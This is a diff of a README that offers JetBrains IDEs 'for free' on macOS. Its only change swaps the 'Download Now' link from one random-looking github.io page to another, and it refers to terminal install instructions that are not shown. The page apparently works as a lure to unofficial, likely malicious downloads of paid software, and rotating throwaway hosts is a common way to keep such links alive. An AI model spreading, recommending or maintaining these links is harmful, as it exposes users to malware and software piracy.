@@ -2,7 +2,7 @@
 
 JetBrains IDEs offer powerful tools for developers to code efficiently on macOS. Follow the instructions below to download and install JetBrains for free on your Mac.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-0078D4?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/jetbrains)
+[![Download Now](https://img.shields.io/badge/Download-Now-0078D4?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/jetbrains)
 
 If the download button doesn't work, follow the terminal instructions below for a seamless installation.
 
